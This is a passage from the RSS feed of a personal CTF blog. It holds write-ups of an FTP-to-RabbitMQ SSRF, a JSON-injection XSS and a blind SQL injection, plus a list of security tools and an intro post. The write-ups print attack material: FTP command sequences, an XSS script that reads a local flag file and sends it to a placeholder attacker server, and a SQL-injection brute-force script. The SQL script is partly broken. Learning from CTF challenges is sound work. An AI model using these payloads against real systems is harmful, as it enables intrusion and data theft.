<p>&ndash; In active mode, the client will specify the IP of the destination to the server. The FTP server will then send the files to the specified IP. The client establishes the communication channel, tells the server the address to send data to, and the server will then open a data channel to the address.</p>
<p>&ndash; In passive mode, the server tells the client where the files will be sent to. In this case, the client will then have to open the data channel as well to get the files. By default, applications running FTP will run on passive mode.</p>
<p>The difference in active and passive really lies in the <code>RETR</code> command in the FTP specifications: active-mode <code>RETR</code> makes the client stipulate the destination IP, and passive-mode <code>RETR</code> makes the server stipulate it.</p>
<p>So for this challenge, we can make the FTP client specify the rabbitmq server as the destination IP, and use <code>RETR</code> to make the FTP server send data to rabbitmq.</p>
<p>And since the FTP protocol for this application handles for the uploading and retrieval of profile pictures, we just need to hide our payload (which would ask the rabbitmq server to send an email with the flag.txt file in it to us) in our profile picture, specify FTP to operate on active (using <code>PORT</code> command), and use the <code>RETR</code> command to let the FTP server send our payload to the rabbitmq server!</p>
<p>Okay, I&rsquo;ve explained alot here. This is the attack plan:</p>
<ul>
<li>Craft a payload that will tell the rabbitmq email queue server to email to us, with flag.txt as the attachment. Hide it in the profile picture (make sure its a png). Upload whatever picture it is as our profile picture.</li>
</ul>
<p>Here&rsquo;s the payload I crafted (a classic SSRF):</p>
<pre><code>{&quot;to&quot;:&quot;yourEmailGoesHere@example.com&quot;,&quot;text&quot;:&quot;Hello would you like a flag&quot;,&quot;attachments&quot;:[{&quot;path&quot;:&quot;/flag.txt&quot;}]}
</code></pre><ul>
<li>Through the username field, input several FTP commands to make the FTP server send our payload to the rabbitmq server. Here, I have made a file called &ldquo;payload.txt&rdquo; that has the post request data with the payload in it:</li>
</ul>
<pre><code>PASS blah
PORT 255,255,255,255,80
STOR payload.txt
PORT 172,32,56,72,0, 15672      &lt;-----rabbitmq server and port
RETR payload.txt
</code></pre><ul>
<li>Hopefully, the rabbitmq server will send us an email!</li>
</ul>
<pre><code>PCTF{not_that_contrived_i_guess}
</code></pre><p>NOTE: Doing it this way means the FTP server was establishing a connection with the rabbitmq one. However, multiple times I tried this the TCP connection would close immediately after I send my request! I worked around this by sending in a bunch of garbage in my payload.txt file alongside the actual payload, so that at least the TCP connection would have to spend time sending all of that data(think: an unending stream of AAAAAs), and persist long enough for the reponse to be recieved.</p>
<p>This was a fun way to learn how FTP servers work and how protocols of the internet operate! I&rsquo;m upset that I didn&rsquo;t have the time to participate when it happened, but nonetheless this was a great challenge :)</p>
<p>Jam</p>]]></content>
        </item>
        
        <item>
            <title>Commonly Used Software</title>
            <link>https://jamvie.net/posts/2020/04/commonly-used-software/</link>
            <pubDate>Sun, 26 Apr 2020 01:30:30 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/04/commonly-used-software/</guid>
            <description>&lt;p&gt;I really like web-based exploits, so I focus primarily on the web challenges when my team and I participate in CTFs.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>I really like web-based exploits, so I focus primarily on the web challenges when my team and I participate in CTFs.</p>
<p>I typically take over the web challenges while my teammates delve into other topics - sometimes I look at the pwn problems, and hopefully I&rsquo;ll include some pwn writeups here! Eventually :P Anyway, as someone who focuses on web stuff, I found myself constantly utilizing the same types of tools and software to help me with challenges. I thought I&rsquo;d share them here!</p>
<p>Web exploits are broad in topic and there definitely doesn&rsquo;t exist one tool for all sploits. However, as I got exposed to more challenges I found patterns in the problems. These patterns indicated the vulnerability that I should be taking advantage of, and therefore, what types of tools I needed to further investigate those vulnerabilities.</p>
<p>However, before I get into the list I would like to make a statement about the nature of this post. This is NOT a cheatsheet on how to hack into your friend&rsquo;s facebook. &ldquo;Hacking&rdquo; for malicious purposes is illegal and can cost you <a href="https://criminal.findlaw.com/criminal-charges/hacking-laws-and-punishments.html">jail time and hefty fines</a>.</p>
<p><strong>I will not divulge information on how to compromise the privacy of individuals without their consent.</strong>
This is a CTF and ethical hacking blog only - what this post is, is a list of tools I found useful when scoping out web challenges for various CTFs!</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p><em>These are not ordered by priority or &ldquo;most utilized&rdquo;.</em></p>
<hr>
<h2 id="curl">cURL</h2>
<p>A must! <a href="https://curl.haxx.se/">cURL</a> is short for &ldquo;Client URL&rdquo;. It&rsquo;s a simple and lightweight command-line tool to transfer data using various network protocols. I use it for basic GET and POST HTTP requests, but its so versatile it can be used for much more! In its simplest form, cURL is amazing to send data to and from a specified server.</p>
<p><a href="https://jamvie.net/posts/02confidence2020_01/">In my CONfidence 2020 write-up for the &ldquo;Cat Web&rdquo; problem</a>, I use cURL heavily to examine the response data from the server with each post request I make.</p>
<h2 id="wireshark">Wireshark</h2>
<p>I gained knowledge in <a href="https://www.wireshark.org/">Wireshark</a> back in my internet computing course days. I recieved a tutorial on the basics of how to use this software - it&rsquo;s a protocol analyzer designed to examine web traffic and capture packet data between two endpoints. This software can show and display packets on all levels of the OSI hierarchy structure - you can see your common HTTP packets, TCP, DNS, to name a common few&hellip;</p>
<p>Plenty of forensic-based problems will give you a capture of internet traffic and hide a flag in there, so wireshark is useful even beyond the web challenges I use it for!</p>
<h2 id="burpsuite">Burpsuite</h2>
<p>From <a href="https://portswigger.net/support/how-to-use-burp-suite">PortSwigger, creators of BurpSuite</a>:</p>
<blockquote>
<p>Burp Suite is an integrated platform for performing security testing of web applications. It is designed to be used by hands-on testers to support the testing process.</p>
</blockquote>
<p>Burp Suite is perfect for testing out all sorts of exploits. It has much more use in testing non-production projects by enterprisal companies, and its a powerful tool for scoping out any possible vulnerabilities of an application. The community version comes with all the basic and necessary tools a CTFer or pentester would need to gauge the security of their application - often, i use it as a proxy when I&rsquo;m trying to scope our API vulnerabilities.</p>
<p>Back in my <a href="https://jamvie.net/posts/01utctf01/">UTCTF &ldquo;Epic Admin Pwn&rdquo; writeup</a>, I mentioned using Burp Suite to scope out the SQLi attack vector and using SQLmap to further exploit it - which is a much faster way than creating your own script to utilize the attack vector that was found in it!</p>
<h2 id="postman">Postman</h2>
<p>If I need to send more complex requests that might make cURL more complex to use, <a href="https://www.postman.com/">Postman</a> is my go to software. I don&rsquo;t just use Postman to send heavier requests to a server, it&rsquo;s also great for testing out RESTful APIs if you&rsquo;re creating one for a personal project. It has a clean UI and is extremely beginner-friendly, so Postman is my go-to for literally anything requiring RESTful API testing.</p>
<h2 id="sqlmap">SQLMap</h2>
<p>SQLmap is a suite of great utilities specifically for SQL-injection based attacks. It automates the detection and exploitation of any SQL-based flaws in an application. It supports most if not all major databases (MySQL, SQLite, etc) and can do everything from simple detection to database table dumping.</p>
<hr>
<p>While this is not an exhaustive list of all the tools I use, these are definitely among the most commonly used softwares that I go to when I need to test and utilize any vulnerabilities in a given CTF challenge. I hope these prove useful to you!</p>
<p>Jam</p>
<h2 id="references">References</h2>
<p><a href="https://knowyourmeme.com/memes/hackerman">Feature Image</a></p>]]></content>
        </item>
        
        <item>
            <title>CONfidence 2020: CatWeb</title>
            <link>https://jamvie.net/posts/2020/04/confidence-2020-catweb/</link>
            <pubDate>Thu, 23 Apr 2020 00:46:19 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/04/confidence-2020-catweb/</guid>
            <description>&lt;p&gt;I participated in CONfidence CTF 2020 teasers in March of this year. I was focusing mainly on this problem, and it really helped me broaden my skills in JSON-related attacks! I have never seen many JSON injections before this, so this was welcome practise.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>I participated in CONfidence CTF 2020 teasers in March of this year. I was focusing mainly on this problem, and it really helped me broaden my skills in JSON-related attacks! I have never seen many JSON injections before this, so this was welcome practise.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>The link to the webpage is: <code>http://catweb.zajebistyc.tf/</code></p>

    <img src="/images/CatWeb_HomePage.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>We have a basic webpage with photos of cute cats filtered by their color. The drop down menu will give us black, red, grey and white cats. At the bottom is a report button, which will take whatever input we get, send it to some server, and respond to us that our report has been&hellip;well. Reported.</p>
<p>Checking out the response content as I was clicking about the page showed me the requests for the &ldquo;kind&rdquo; (colour) of cats I chose based on the drop down menu. The request was just a small JSON string stipulating what kind I asked for, and I guess the server takes that input and returns whatever.</p>
<pre><code>curl &quot;http://catweb.zajebistyc.tf/cats?kind=grey&quot;
</code></pre><p>That got me thinking, can I ask for cats of a kind not in the drop down menu?
Editing the request to change the kind from a colour to just absolute garbage&hellip;</p>
<pre><code>curl &quot;http://catweb.zajebistyc.tf/?kind=djfa&quot;
</code></pre>
    <img src="/images/NotFound.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Aha! Our text got echoed back to us in the response. There isn&rsquo;t any input validation in the JSON request! This must be a way in.</p>
<p>To test how far I could go with it, I decided to hide an XSS in the JSON, seeing as how the URL we are taken to after any sort of response also has the JSON text in it.</p>
<p>I typed this in as the URL:</p>
<pre><code>http://catweb.zajebistyc.tf/?&quot;,&quot;status&quot;:&quot;ok&quot;,&quot;content&quot;:[&quot;\&quot;&lt;img src=deadbeef onerror=alert(document.title)&gt; &lt;/img&gt;],&quot;ignore&quot;:&quot;
</code></pre><p>If there was a JSON vulnerability here, then going to this website would load up an alert with the title of the webpage (&ldquo;my cats&rdquo;). What would happen is it would attempt to load an image from the source called &ldquo;deadbeef&rdquo;, and when it can&rsquo;t find the source, it would load as an error. If the image loaded as an error, pop up an alert with the name of the webpage.</p>

    <img src="/images/XSSJsonInCatWeb.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>:) Great! There is definitely JSON injection in play here. Let&rsquo;s see what we can do with it!</p>
<p>Using curl to delve deeper into the webpage, I tried to make it list directories with the command:</p>
<pre><code>curl &quot;http://catweb.zajebistyc.tf/cats?kind=..&quot;
</code></pre>
    <img src="/images/CatWebTemplates.jpg"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>I traversed through the directories, but in the templates subfolder&hellip;</p>

    <img src="/images/CatWebFlagLocn.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Aha! The <code>flag.txt</code> file is in there. Now we just need to somehow read it from the browser. The fact that I was able to find the local files like this means something: the path of templates looks alot like <code>file:///app/templates/flag.txt</code> - Note the root path name: file. A same-origin policy here could treat all files with this starting origin as from the same place.</p>
<p>We can use this to our advantage: create an XSS attack on the <code>file://</code> path.</p>
<p>Since an XSS endpoint was found using the JSON vulnerabilities in the URL, and there exists a report function, this is all a pretty classic XSS attack from here.</p>
<p>Craft our payload script to fetch the flag.txt from <code>file://</code>. Here&rsquo;s mine called (xss.js):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">url</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://yourServer.com/6060?&#39;</span>
<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;file:///app/templates/flag.txt&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">resp</span>=&gt;<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">flag</span>=&gt;<span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">url</span><span style="color:#f92672">+</span>(<span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">flag</span>) <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;Nothing&#39;</span>)));
</code></pre></div><p>Report this url with our payload in it:</p>
<pre><code>file:///app/templates/index.html?&quot;, &quot;status&quot;: &quot;ok&quot;, &quot;content&quot;:[&quot;\u0022&gt;&lt;script src=http://yourServer.com:6060/xss.js&gt;&lt;/script&gt;&quot;],&quot;ignore&quot;:&quot;
</code></pre><p>Now we wait for our server to retrieve the flag for us once someone checks out our reported URL :)</p>
<p><code>flag:p4{can_i_haz_a_piece_of_flag_pliz?}</code></p>
<p>This was a cool challenge to do that really helped me stretch my XSS skills and teach me how to be thorough when scoping out webpages for possible XSS attacks. I quite enjoyed this challenge! Thank you to <a href="https://p4.team/">P4</a> for hosting the CONfidence 2020 teaser :)</p>
<p>Jam</p>
<h2 id="references">References</h2>
<p>feature image credit: <a href="https://www.pexels.com/@peng-louis-587527">Peng Louis</a> on Pexels</p>]]></content>
        </item>
        
        <item>
            <title>UTctf 2020: Epic Admin Pwn</title>
            <link>https://jamvie.net/posts/2020/04/utctf-2020-epic-admin-pwn/</link>
            <pubDate>Wed, 22 Apr 2020 00:46:19 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/04/utctf-2020-epic-admin-pwn/</guid>
            <description>I particpated in UTCTF with my team in March 2020, held and operated by the University of Texas ISSS. My team and I solved a very fun SQLi-based attack! This challenge helped me to refine my python skills cause the lord knows I needed it, as well as reinforced my knowledge about SQL-based attacks. This is the first web challenge I solved in the CTF, and admittedly the one that I enjoyed the most to do.</description>
            <content type="html"><![CDATA[<p>I particpated in UTCTF with my team in March 2020, held and operated by the University of Texas <a href="https://www.isss.io/">ISSS</a>. My team and I solved a very fun SQLi-based attack! This challenge helped me to refine my python skills cause the lord knows I needed it, as well as reinforced my knowledge about SQL-based attacks. This is the first web challenge I solved in the CTF, and admittedly the one that I enjoyed the most to do.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>We are presented with a clean and minimal login page. The challenge&rsquo;s description says that &ldquo;the password is the flag&rdquo;. Well, since this is only a login page, I&rsquo;d figure to try and get into admin somehow.</p>

    <img src="/images/UTCTFscreenshot1.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Initial attempts to do some scoping for SQL vulnerabilities didn&rsquo;t do anything. Inputting a single quote ' mark wouldn&rsquo;t show anything useful. So, I went in kinda blind, and did a pretty standard SQL attack: <code>admin--</code> If there were vulnerable SQL queries to be had, my input would malform the query to only return the entries where the username == admin.
And it worked!</p>

    <img src="/images/UTCTFscreenshot2.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>It&rsquo;s a static welcome page, so I didn&rsquo;t get anything useful past learning that the admin&rsquo;s username was, in fact, admin. And the challenge&rsquo;s description told me as such - if I wanted the password, I needed to do something else.</p>
<p>The fact that I got into admin meant that I malformed the SQL query so that it would ignore any sort of password checking. But, I kinda need some form of password validation in order to get any headstart on what it was. Luckily, SQL utilizes alot of logic-based keywords that lets us essentially guess the password with custom SQL we inject into it. We would want to inject rogue SQL so that the underlying query would look like,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL">
<span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39; AND pass LIKE (&#39;</span>J<span style="color:#f92672">%</span><span style="color:#e6db74">&#39;)
</span><span style="color:#e6db74">
</span></code></pre></div><p>This will return true if the admin&rsquo;s password starts with a J.</p>
<p>While I use the SQL &lsquo;LIKE&rsquo; keyword here, another keyword called &ldquo;substr&rdquo; or &ldquo;substring&rdquo; exists that I prefer. <a href="https://www.sqlservertutorial.net/sql-server-string-functions/sql-server-substring-function/">From SQL Server Tutorial:</a></p>
<blockquote>
<p>The SUBSTRING() extracts a substring with a specified length starting from a location in an input string.</p>
</blockquote>
<p>A teammate of mine actually created a script that bruteforced the alphanumerics letter by letter until we printed the password, but I decided to take a shot at creating one myself using python <del>because its about time I actually learn practical python for myself</del>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz1234567890{}&#39;</span>

<span style="color:#75715e"># url here would&#39;ve been the epic admin pwn site</span>
url <span style="color:#f92672">=</span> example<span style="color:#f92672">.</span>com

<span style="color:#66d9ef">for</span> index <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">40</span>):
    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> chars: 
        req <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#39; AND SUBSTR(flag, {index}, 1) = &#39;{char}&#39;--&#34;</span> 
        data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: req, <span style="color:#e6db74">&#34;pass&#34;</span>: <span style="color:#e6db74">&#34;JamVieSaysHello&#34;</span>} 
        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data)
        <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>equals(<span style="color:#e6db74">&#39;Welcome, admin!&#39;</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>: 
            flag <span style="color:#f92672">+=</span> char 
            <span style="color:#66d9ef">print</span>(flag) 
            <span style="color:#66d9ef">continue</span> 
</code></pre></div><p>The &ldquo;req&rdquo; var here is our custom SQL. The idea here is to test out every character against the password&rsquo;s character at the given index. If they match, store it into our buffer array. When we reach the nullbyte character which terminates strings, then we print out the buffer, which should have correctly found the password!</p>
<pre><code>utflag{dual1pa1sp3rf3ct}
</code></pre><p>Note that, we could technically put anything we wanted into the password field - our input to it never gets checked, because we override whatever checking existed for it with our custom SQL.</p>
<p>There are admittedly faster ways to do this, for example, if you have burpsuite and sqlmap you could save the post request data into a text file and have sqlmap dump the underlying database for you, which should also return the flag. However, creating the script and testing it out was alot of fun!</p>
<p>Jam</p>
]]></content>
        </item>
        
        <item>
            <title>Jamvie&#39;s first post</title>
            <link>https://jamvie.net/posts/2020/04/jamvies-first-post/</link>
            <pubDate>Mon, 20 Apr 2020 21:27:12 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/04/jamvies-first-post/</guid>
            <description>Hi, and welcome to my CTF blog. I&amp;rsquo;m just a software dev with a hobby for CTFs, and I thought a blog would be a good way to stash all my long-archived writeups for CTF challenges I participated in. I&amp;rsquo;m by no means an expert on the topic, but if someone stumbles upon here and gains a newfound interest in cybersecurity, that would be pretty cool.
Over the next few weeks I will upload my old writeups for some CTFs that occurred this year and last, so stay tuned!</description>
            <content type="html"><![CDATA[<p>Hi, and welcome to my CTF blog. I&rsquo;m just a software dev with a hobby for CTFs, and I thought a blog would be a good way to stash all my long-archived writeups for CTF challenges I participated in. I&rsquo;m by no means an expert on the topic, but if someone stumbles upon here and gains a newfound interest in cybersecurity, that would be pretty cool.</p>
<p>Over the next few weeks I will upload my old writeups for some CTFs that occurred this year and last, so stay tuned!</p>
<p>Jam
:)</p>
]]></content>
        </item>
        
    </channel>
</rss>
